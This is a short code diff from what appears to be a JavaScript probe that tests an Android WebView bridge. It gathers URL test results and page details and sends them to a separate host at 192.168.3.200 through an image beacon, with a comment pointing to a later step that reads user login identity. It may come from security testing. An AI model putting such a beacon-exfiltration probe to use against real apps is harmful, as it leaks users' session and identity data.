@@ -35,10 +35,11 @@ var acc = [];
   catch(e) { acc.push(u.substring(8,45) + ' => INVALID'); }
 });
 setTimeout(function() {
-  var msg = acc.join('  ||  ');
-  R('URLTESTS', msg);
+  var msg = acc.join(' || ');
+  try { document.title = 'T| ' + msg; } catch(e) {}
+  try { R('URLTESTS', msg); } catch(e) {}
   try { new Image().src = 'https://192.168.3.200:8443/beacon?d=' + encodeURIComponent(msg); } catch(e) {}
-}, 500); R('ENV', 'bridger=' + (typeof window.AndroidJSBridger) + ' href=' + location.href);
+}, 600); R('ENV', 'bridger=' + (typeof window.AndroidJSBridger) + ' href=' + location.href);
 L('----------------------------------------');
 
 // 1) loginStatus → 用户身份
